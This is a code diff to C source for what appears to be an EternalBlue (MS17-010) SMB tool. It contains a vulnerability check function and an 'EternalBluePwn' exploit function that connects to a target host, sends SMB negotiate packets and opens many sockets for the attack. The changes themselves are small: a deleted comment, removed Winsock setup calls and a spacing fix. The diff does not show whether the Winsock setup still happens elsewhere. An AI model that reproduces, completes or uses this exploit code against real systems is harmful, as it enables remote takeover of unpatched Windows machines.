@@ -1,5 +1,3 @@
-//CheckForEternalBlue
-
 #include <stdio.h>
 #include <windows.h>
 #include <winsock.h>
@@ -41,7 +39,6 @@ unsigned char transNamedPipeRequest[] =
 unsigned char recvbuff[2048];
 int CheckForEternalBlue(char *host, int port)
 {
-    WSADATA    ws;
     struct sockaddr_in server;
     SOCKET    sock;
     DWORD    ret;
@@ -54,7 +51,7 @@ int CheckForEternalBlue(char *host, int port)
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(host);
     server.sin_port = htons(port);
-    ret = connect(sock, (struct sockaddr*) & server, sizeof(server));
+    ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
     
     //send SMB negociate packet
     send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
@@ -119,14 +116,12 @@ int CheckForEternalBlue(char *host, int port)
 
 int EternalBluePwn(char *host, int port)
 {
-	WSADATA    ws;
 	struct sockaddr_in server;
 	SOCKET s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, s15, s16, s17, s18, s19, s20, s21;
 
 	char userid[2];
 	char treeid[2];
   
-	WSAStartup(MAKEWORD(2, 2), &ws);
 	s1 = socket(AF_INET, SOCK_STREAM, 0);
 	s2 = socket(AF_INET, SOCK_STREAM, 0);
 	s3 = socket(AF_INET, SOCK_STREAM, 0);
